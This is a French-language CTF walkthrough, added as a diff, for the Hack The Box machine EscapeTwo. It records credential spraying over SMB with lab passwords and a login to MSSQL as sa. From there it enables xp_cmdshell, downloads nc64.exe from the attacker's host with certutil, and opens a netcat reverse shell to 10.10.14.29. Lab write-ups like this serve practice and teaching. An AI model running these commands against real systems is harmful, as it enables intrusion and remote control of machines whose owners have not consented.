@@ -88,3 +88,97 @@ SMB         10.10.11.51     445    DC01             Users           READ
 
 smbclient.py rose:'KxEPkKe6R8su'@10.10.11.51
 ```
+
+```bash
+First Name 	Last Name 	Email 	Username 	Password
+Angela 	Martin 	angela@sequel.htb 	angela 	0fwz7Q4mSpurIt99
+Oscar 	Martinez 	oscar@sequel.htb 	oscar 	86LxLBMgEWaKUnBG
+Kevin 	Malone 	kevin@sequel.htb 	kevin 	Md9Wlq1E5bZnVDVo
+NULL 	NULL 	sa@sequel.htb 	sa 	MSSQLP@ssw0rd!
+```
+
+On trouve finalement que oscar est un utilisateur du domaine.
+```bash
+➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'sa' -p 'MSSQLP@ssw0rd!' -d 'sequel.htb' 10.10.11.51    
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
+SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
+➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'kevin' -p 'Md9Wlq1E5bZnVDVo' -d 'sequel.htb' 10.10.11.51    
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
+SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
+➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'oscar' -p '86LxLBMgEWaKUnBG' -d 'sequel.htb' 10.10.11.51    
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
+SMB         10.10.11.51     445    DC01             [*] Enumerated shares
+SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
+SMB         10.10.11.51     445    DC01             -----           -----------     ------
+SMB         10.10.11.51     445    DC01             Accounting Department READ            
+SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.51     445    DC01             C$                              Default share
+SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.11.51     445    DC01             Users           READ            
+➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'angela' -p '0fwz7Q4mSpurIt99' -d 'sequel.htb' 10.10.11.51
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
+SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
+```
+
+```bash
+bloodhound-python -c All -u 'ocar' -p '86LxLBMgEWaKUnBG' -d sequel.htb -dc 10.10.11.51
+```
+Donne rien
+
+On peut utiliser les credentials du compte sa sur mysql:
+```bash
+mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51
+```
+
+```sql
+SQL (sa  dbo@master)> select @@version
+                                                                                                                                                                                                                           
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+	Sep 24 2019 13:48:23 
+	Copyright (C) 2019 Microsoft Corporation
+	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+
+
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+EXEC xp_cmdshell 'whoami'
+
+sequel\sql_svc
+
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.29:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
+output                                                
+---------------------------------------------------   
+****  Online  ****                                    
+
+  0000  ...                                           
+
+  aab0                                                
+
+CertUtil: -URLCache command completed successfully.   
+
+NULL        
+```
+On a dl nc64.exe sur le serveur Windows, on peut maintenant l'utiliser.
+
+Ensuite on peut ouvrir un listener nc:
+```bash
+nc -lnvp 4444
+```
+
+```sql
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.29 4444';
+```
